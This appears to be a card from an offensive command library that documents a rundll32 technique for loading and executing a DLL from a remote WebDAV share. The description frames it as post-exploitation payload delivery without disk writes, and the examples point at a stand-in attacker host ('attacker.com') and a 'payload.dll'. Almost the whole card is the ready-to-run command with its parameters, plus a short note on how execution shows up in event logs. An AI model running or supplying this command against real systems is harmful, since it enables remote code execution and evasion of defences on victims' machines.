---
id: 955bbebf-c522-4a36-8ad3-d048569d187d
name: rundll32-webdav-dll-execute
type: command
executor: cmd
data: 'rundll32 \\$_WEBDAV_SERVER\\$_SHARE\\$_DLL_NAME, $_ENTRYPOINT'
output: null
created_at: '2023-04-06T03:56:26.894194+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - rundll32
  - webdav
  - execution
  - evasion
verified: true
validated: true
---

# rundll32-webdav-dll-execute

## Command

```cmd
rundll32 \\$_WEBDAV_SERVER\\$_SHARE\\$_DLL_NAME, $_ENTRYPOINT
```

## Description

This command uses rundll32.exe to load a DLL from a remote WebDAV share into memory and execute a specified function, enabling remote code execution without local disk writes. Use it in post-exploitation for payload delivery over network shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_WEBDAV_SERVER | IP address or hostname of the WebDAV server (e.g., 192.168.1.100) | Yes |
| $_SHARE | WebDAV share or folder path (e.g., share) | Yes |
| $_DLL_NAME | Name of the DLL file to load (e.g., payload.dll) | Yes |
| $_ENTRYPOINT | Exported function name in the DLL to invoke (e.g., Start) | Yes |

## Examples

### Basic Usage

```cmd
rundll32 \\192.168.1.100\\share\\payload.dll,Start
```

### Advanced Usage

For shares requiring authentication, ensure credentials are available in the session; otherwise, the command fails with access denied.

```cmd
rundll32 \\attacker.com\\public\\malicious.dll,EntryPoint
```

## Expected Output

Rundll32 produces no stdout; successful execution is inferred from the payload's behavior, such as a new network connection or process spawn. Failure results in a Windows error popup (e.g., "The specified module could not be found") or Event Log entry (ID 4688 with rundll32 parent).

## Related

- [[procedures/Rundll32-Download-and-Execute-via-WebDAV-or-Remote-Script]]
